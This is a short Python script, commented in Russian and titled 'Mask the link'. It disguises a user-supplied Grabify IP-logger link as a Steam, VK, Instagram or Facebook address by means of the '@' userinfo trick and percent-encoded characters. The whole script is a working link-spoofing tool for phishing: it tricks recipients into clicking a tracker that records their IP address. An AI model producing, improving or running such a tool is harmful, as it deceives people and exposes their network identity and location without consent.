#!/usr/bin/env python3 #
# -*- coding: utf-8 -*-

#Выше говорю на каком языке и с какой кодировкой буду писать




#      Данный код был написан программистом
#███╗░░░███╗░█████╗░██████╗░░█████╗░██╗░░░██╗░██████╗
#████╗░████║██╔══██╗██╔══██╗██╔══██╗██║░░░██║██╔════╝
#██╔████╔██║███████║██████╔╝██║░░╚═╝██║░░░██║╚█████╗░
#██║╚██╔╝██║██╔══██║██╔══██╗██║░░██╗██║░░░██║░╚═══██╗
#██║░╚═╝░██║██║░░██║██║░░██║╚█████╔╝╚██████╔╝██████╔╝
#╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░░╚═════╝░╚═════╝░







#Все импорты
from colorama import Fore,init
import random, string
init()

def ifHttps(url):
    if (url[0:8] == "https://"):
        url = url[8::]
    return url
def ifNotHttps(url):
    encodet_url = url.replace('/','%83%79%83%73')
    if (encodet_url[0:8] != "https://"):
        encodet_url = "https://"+encodet_url
    return encodet_url
def enter(name_messenger):
    nick = input(f"Enter your {name_messenger}: ")
    grabify = input("Enter your grabify link: ")
    if (name_messenger == "steam nick"):
        print(f"https://steamcommunity.com%83%79%83%73id=%47{nick}@{ifHttps(grabify)}")
    elif (name_messenger == "id_vk"):
        print(f"https://vk.com%83%79%83%73:GIFT=allstikers:ID={'%'.join(str(ord(c)) for c in name_messenger)}@{ifHttps(grabify)}")
    elif (name_messenger == "instagram"):
        print(f"https://instagram.com%83%79%83%73:GIFT={randomword(random.randint(7, 10))}@{ifHttps(grabify)}")
    elif (name_messenger == "facebook"):
        print(f"https://facebook.com%83%79%83%73:GIFT=@{ifHttps(grabify)}")
def randomword(length):
   letters = string.ascii_lowercase
   return ''.join(random.choice(letters) for i in range(length))

print(Fore.GREEN + """
▒█▀▄▀█ █▀▀█ █▀▀ █░█ 　 ▀▀█▀▀ █░░█ █▀▀ 　 █░░ ░▀░ █▀▀▄ █░█ 
▒█▒█▒█ █▄▄█ ▀▀█ █▀▄ 　 ░░█░░ █▀▀█ █▀▀ 　 █░░ ▀█▀ █░░█ █▀▄ 
▒█░░▒█ ▀░░▀ ▀▀▀ ▀░▀ 　 ░░▀░░ ▀░░▀ ▀▀▀ 　 ▀▀▀ ▀▀▀ ▀░░▀ ▀░▀
""" + Fore.RESET)
a = input(Fore.WHITE + "Please press Enter: " + Fore.RESET)
for i in range(20):
    print("")
i = 1
all_port = ["Steam", "VK","Instagram","Facebook", "Your URL"]
try:
    for ports in all_port:
        print(f"{Fore.GREEN + "["}{i}]{Fore.RESET} {Fore.RED + ports + Fore.RESET}")
        i+=1
    print("")
    b = int(input("Choise: "))
    enter('steam nick') if b == 1 else None
    enter('id_vk') if b == 2 else None
    enter('instagram') if b == 3 else None
    enter('facebook') if b == 4 else None
    if (b == 5):
        your_url = input(f"Enter your url {Fore.RED}WITH OUT '/'{Fore.RESET}: ")
        grabify = input("Enter your grabify link: ")
        print(f"{ifNotHttps(your_url)}@{ifHttps(grabify)}")
except Exception as ex:
    print(Fore.RED + "Something ERROR :(")
    print(ex)
finally:
    exit()

